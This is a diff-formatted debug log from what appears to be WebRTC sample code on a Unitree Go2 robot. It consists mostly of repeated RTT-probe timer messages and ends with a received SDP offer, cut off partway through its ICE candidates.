+[2024-05-17 12:42:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:42:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:43:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:43:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:43:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:44:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:44:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:44:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:45:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:45:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:45:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:46:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:46:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:46:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:47:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:47:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:47:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:48:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:48:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:48:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:49:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:49:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:49:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:50:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:50:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:50:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:51:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:51:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:51:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:52:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:52:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:52:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:53:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:53:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:53:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:54:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:54:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:54:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:55:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:55:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:55:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:56:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:56:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:56:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:57:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:57:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:57:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:58:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:58:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:58:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:59:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:59:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:59:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:00:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:00:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:00:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:01:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:01:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:01:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:02:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:02:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:02:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:03:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:03:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:03:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:04:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:04:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:04:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:05:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:05:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:05:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:06:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:06:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:06:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:07:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:07:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:07:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:08:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:08:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:08:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:09:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:09:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:09:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:10:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:10:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:10:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:11:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:11:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:11:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:12:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:12:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:12:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:13:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:13:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:13:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:14:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:14:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:14:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:15:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:15:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:15:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:16:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:16:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:16:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:17:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:17:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:17:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:18:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:18:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:18:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:19:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:19:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:19:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:20:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:20:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:20:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:21:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:21:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:21:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:22:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:22:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:22:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:23:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:23:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:23:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:24:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:24:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:24:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:25:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:25:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:25:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:26:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:26:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:26:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:27:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:27:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:27:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:28:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:28:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:28:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:29:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:29:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:29:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:30:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:30:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:30:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:31:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:31:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:31:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:32:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:32:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:32:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:33:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:33:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:33:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:34:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:34:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:34:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:35:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:35:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:35:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:36:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:36:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:36:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:37:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:37:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:37:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:38:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:38:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:38:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:39:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:39:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:39:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:40:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:40:15 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/signaling.h:15]: do_webrtc_req_take() trigger
+[2024-05-17 13:40:15 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1768]: offerReceived() receive offer, offer_len is 5234
+[2024-05-17 13:40:15 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1769]: offerReceived() receive offer, offer_content is {"sdp":"v=0\r\no=- 3456789012 1 IN IP4 0.0.0.0\r\ns=-\r\nt=0 0\r\na=fingerprint:sha-256 4A:AD:B9:B1:3C:82:CB:D4:8D:4F:40:58:5C:C8:49:71:19:F4:B6:B1:34:71:22:B5:36:9B:8F:D2:3E:AA:33:53\r\na=group:BUNDLE 0 1 2 3 4\r\nm=fingerprint\r\ni=sha-256 FB:1D:DC:FE:96:7E:07:64:6E:0E:CC:7C:91:6B:4F:A8:2A:04:35:E6:9B:82:7D:BE:3C:35:EB:9F:71:60:22:1B\r\nc=IN IP4 0.0.0.0\r\na=ice-ufrag:uDJ3\r\na=ice-pwd:YviBDJ58gtsO1jrnrRYxt3\r\na=setup:actpass\r\na=mid:0\r\nm=video 9 UDP/TLS/RTP/SAVPF 96\r\na=ice-ufrag:uDJ3\r\na=ice-pwd:YviBDJ58gtsO1jrnrRYxt3\r\na=mid:1\r\nm=video 9 UDP/TLS/RTP/SAVPF 96\r\na=ice-ufrag:uDJ3\r\na=ice-pwd:YviBDJ58gtsO1jrnrRYxt3\r\na=mid:2\r\nm=video 9 UDP/TLS/RTP/SAVPF 96\r\na=ice-ufrag:uDJ3\r\na=ice-pwd:YviBDJ58gtsO1jrnrRYxt3\r\na=mid:3\r\nm=application 9 UDP/DTLS/SCTP webrtc-datachannel\r\na=ice-ufrag:uDJ3\r\na=ice-pwd:YviBDJ58gtsO1jrnrRYxt3\r\na=mid:4\r\na=candidate:b06876595f855fe0ce5212e1b302209c 1 udp 2130706431 192.168.1.233 60931 typ host\r\r\na=candidate:f5a9be8b49d027a84cd23cab8db3a9af 1 udp 2130706431 100.64.113.47 50157 typ host\r\r\na=candidate:edeb15bd8d3f0dbec18897b0ffdb6515 1 udp 2130706431 192.168.123.100 62290 typ 